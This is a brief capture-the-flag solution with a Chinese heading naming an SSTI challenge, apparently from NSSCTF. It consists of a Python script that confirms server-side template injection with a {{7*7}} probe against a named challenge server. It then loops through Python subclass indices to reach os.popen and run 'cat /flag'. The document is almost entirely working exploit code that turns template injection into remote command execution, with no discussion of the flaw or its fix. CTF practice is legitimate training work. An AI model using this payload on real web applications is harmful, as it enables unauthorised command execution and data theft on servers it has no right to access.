## web1 锦家有什么 SSTI注入 https://chat.deepseek.com/share/jb5ldmdeahuabaxrqj
```python
import requests
url = "http://node10.anna.nssctf.cn:26111/try_a_try"

# 测试SSTI
test_payload = "{{7*7}}"
params = {"name": test_payload}
response = requests.get(url, params=params)
if "49" in response.text:
    print("SSTI confirmed!")
else:
    print("SSTI not confirmed. Check the parameter name.")
    exit()

# 枚举索引范围，常见索引在100-300之间
for index in range(100, 300):
    payload = "{{ ''.__class__.__mro__[1].__subclasses__()[%d].__init__.__globals__['os'].popen('cat /flag').read() }}" % index
    params["name"] = payload
    response = requests.get(url, params=params)
    if "NSSCTF" in response.text or "flag" in response.text.lower():
        print(f"Found flag at index {index}!")
        print(response.text)
        break
else:
    print("Flag not found in the range 100-300. Try a wider range.")
```
